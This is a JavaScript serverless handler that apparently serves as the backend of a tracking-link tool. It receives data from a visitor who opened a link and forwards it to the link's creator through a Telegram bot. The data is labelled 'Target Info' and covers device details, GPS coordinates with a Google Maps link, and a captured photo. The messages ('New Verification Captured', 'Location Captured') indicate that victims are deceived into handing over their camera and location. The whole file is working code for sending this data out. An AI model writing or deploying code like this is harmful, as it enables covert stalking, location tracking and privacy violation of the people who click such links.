export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const ADMIN_ID = process.env.ADMIN_ID;
  const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID;
  const JSONBIN_MASTER_KEY = process.env.JSONBIN_MASTER_KEY;

  const { linkId, type, photoData, coords, user_agent, screen_res, platform, language } = req.body;

  if (!linkId) {
    return res.status(400).json({ error: 'Missing linkId' });
  }

  try {
    // STEP 1: Look up who created this link from JSONBin
    const lookupResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
      headers: { 'X-Master-Key': JSONBIN_MASTER_KEY }
    });
    const jsonbinData = await lookupResponse.json();
    const links = jsonbinData?.record?.links || {};
    
    const linkData = links[linkId];
    let targetChatId = ADMIN_ID;
    let creatorName = 'Unknown';
    
    if (linkData && linkData.creator_chat_id) {
      targetChatId = linkData.creator_chat_id;
      creatorName = linkData.creator_name;
    }

    // STEP 2: Build and send the data
    let message = `🛡️ **New Verification Captured!**\n\n`;
    message += `👤 Target Info:\n`;
    message += `📱 Platform: ${platform || 'Unknown'}\n`;
    message += `🌐 Browser: ${user_agent ? user_agent.substring(0, 100) : 'Unknown'}\n`;
    message += `🖥️ Screen: ${screen_res || 'Unknown'}\n`;
    message += `🗣️ Language: ${language || 'Unknown'}\n`;
    message += `⏰ Time: ${new Date().toISOString()}\n\n`;

    // Send text info first
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: targetChatId, 
        text: message,
        parse_mode: 'Markdown'
      })
    });

    // Send location if available
    if (coords && coords.lat && coords.lng) {
      const locMessage = 
`📍 **Location Captured!**

Latitude: \`${coords.lat}\`
Longitude: \`${coords.lng}\`
Accuracy: ${coords.accuracy || 'N/A'} meters
🌐 [View on Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: targetChatId, 
          text: locMessage,
          parse_mode: 'Markdown'
        })
      });
    }

    // Send photo if available
    if (photoData) {
      const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
      const buffer = Buffer.from(base64Data, 'base64');

      const boundary = '----FormBoundary' + Math.random().toString(36).substring(2);
      
      let bodyStart = '';
      bodyStart += `--${boundary}\r\n`;
      bodyStart += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
      bodyStart += `${targetChatId}\r\n`;
      bodyStart += `--${boundary}\r\n`;
      bodyStart += `Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n`;
      bodyStart += `Content-Type: image/jpeg\r\n\r\n`;
      
      const bodyEnd = `\r\n--${boundary}--\r\n`;
      const startBuffer = Buffer.from(bodyStart, 'utf-8');
      const endBuffer = Buffer.from(bodyEnd, 'utf-8');
      const finalBody = Buffer.concat([startBuffer, buffer, endBuffer]);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': finalBody.length.toString()
        },
        body: finalBody
      });
    }

    res.status(200).json({ success: true, sentTo: targetChatId });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error: ' + error.message });
  }
}
